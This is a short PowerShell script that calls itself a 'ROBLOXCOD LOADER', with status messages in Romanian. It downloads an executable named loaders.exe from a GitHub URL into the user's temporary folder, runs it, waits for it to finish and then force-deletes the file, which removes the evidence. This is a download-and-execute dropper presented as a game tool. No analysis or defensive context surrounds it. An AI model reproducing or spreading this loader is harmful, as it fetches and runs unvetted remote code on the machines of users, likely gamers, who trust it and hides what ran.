Write-Host "==============================" -ForegroundColor Cyan
Write-Host "      ROBLOXCOD LOADER        " -ForegroundColor Blue
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""

$exeName = "loaders.exe"
$exeUrl  = "https://github.com/regeele478-glitch/supreme/blob/main/loaders.exe"
$exePath = Join-Path $env:TEMP $exeName

Write-Host "[+] Descarc $exeName..."
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

Write-Host "[+] Pornesc aplicatia..."
Start-Process -FilePath $exePath -Wait

Write-Host "[+] Sterg fisierul..."
if (Test-Path $exePath) {
    Remove-Item $exePath -Force
}

Write-Host "[✔] Gata!"
Pause